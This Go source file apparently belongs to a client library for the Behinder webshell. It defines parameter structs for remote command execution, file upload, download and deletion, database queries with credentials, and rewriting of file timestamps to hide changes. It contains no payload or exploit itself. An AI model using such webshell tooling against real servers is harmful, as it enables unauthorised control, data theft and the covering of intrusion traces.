package behinder

import (
	"errors"

	"github.com/dusbot/maxx/libs/webshell/lib/utils"
)

type OnlyJavaParams struct {
	ForcePrint bool `json:"forcePrint,string"`
	NotEncrypt bool `json:"notEncrypt,string"`
}

type PingParams struct {
	OnlyJavaParams
	Content string `json:"content"`
}

func (p *PingParams) SetDefaultAndCheckValue() error {
	if len(p.Content) == 0 {
		p.Content = utils.RandomRangeString(50, 200)
	}
	return nil
}

type BasicInfoParams struct {
	OnlyJavaParams
	WhatEver string `json:"whatever"`
}

func (b *BasicInfoParams) SetDefaultAndCheckValue() error {
	if len(b.WhatEver) == 0 {
		b.WhatEver = utils.RandomRangeString(50, 200)
	}
	return nil
}

type ExecParams struct {
	OnlyJavaParams
	Cmd  string `json:"cmd"`
	Path string `json:"path"`
}

func (e *ExecParams) SetDefaultAndCheckValue() error {
	return nil
}

type ListFiles struct {
	OnlyJavaParams
	Path string `json:"path"`
}

func (l *ListFiles) SetDefaultAndCheckValue() error {
	if len(l.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type GetTimeStamp struct {
	OnlyJavaParams
	Path string `json:"path"`
}

func (g GetTimeStamp) SetDefaultAndCheckValue() error {
	if len(g.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type UpdateTimeStamp struct {
	OnlyJavaParams
	Path            string `json:"path"`
	CreateTimeStamp string `json:"createTimeStamp"`
	AccessTimeStamp string `json:"accessTimeStamp"`
	ModifyTimeStamp string `json:"modifyTimeStamp"`
}

func (u UpdateTimeStamp) SetDefaultAndCheckValue() error {
	if len(u.Path) == 0 {
		return errors.New("path is empty")
	}
	if len(u.CreateTimeStamp) == 0 {
		return errors.New("createTimeStamp is empty")
	}
	if len(u.AccessTimeStamp) == 0 {
		return errors.New("accessTimeStamp is empty")
	}
	return nil
}

type DeleteFile struct {
	OnlyJavaParams
	Path string `json:"path"`
}

func (d DeleteFile) SetDefaultAndCheckValue() error {
	if len(d.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type ShowFile struct {
	OnlyJavaParams
	Path    string `json:"path"`
	Charset string `json:"charset"`
}

func (s ShowFile) SetDefaultAndCheckValue() error {
	if len(s.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type RenameFile struct {
	OnlyJavaParams
	Path    string `json:"path"`
	NewPath string `json:"newPath"`
}

func (r RenameFile) SetDefaultAndCheckValue() error {
	if len(r.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type CreateFile struct {
	OnlyJavaParams

	Path string `json:"path"`
}

func (c CreateFile) SetDefaultAndCheckValue() error {
	if len(c.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type CreateDirectory struct {
	OnlyJavaParams

	Path string `json:"path"`
}

func (c CreateDirectory) SetDefaultAndCheckValue() error {
	if len(c.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type DownloadFile struct {
	OnlyJavaParams
	Path string `json:"path"`
}

func (d DownloadFile) SetDefaultAndCheckValue() error {
	if len(d.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type UploadFile struct {
	OnlyJavaParams

	Path    string `json:"path"`
	Content []byte `json:"content"`
	IsChunk bool   `json:"isChunk"`
}

func (u UploadFile) SetDefaultAndCheckValue() error {
	if len(u.Path) == 0 {
		return errors.New("path is empty")
	}
	if len(u.Content) == 0 {
		return errors.New("content is empty")
	}
	return nil
}

type AppendFile struct {
	OnlyJavaParams
	Path    string `json:"path"`
	Content []byte `json:"content"`
}

func (a AppendFile) SetDefaultAndCheckValue() error {
	if len(a.Path) == 0 {
		return errors.New("path is empty")
	}
	return nil
}

type DBManagerParams struct {
	OnlyJavaParams
	Type     string `json:"type"`
	Host     string `json:"host"`
	Port     int    `json:"port,string"`
	User     string `json:"user"`
	Pass     string `json:"pass"`
	Database string `json:"database"`
	Sql      string `json:"sql"`
}

func (d DBManagerParams) SetDefaultAndCheckValue() error {
	if len(d.Type) == 0 {
		return errors.New("db type is empty")
	}
	if len(d.Host) == 0 {
		return errors.New("db host is empty")
	}
	if d.Port == 0 {
		return errors.New("db port is error")
	}
	if len(d.Sql) == 0 {
		return errors.New("db sql is empty")
	}
	return nil
}
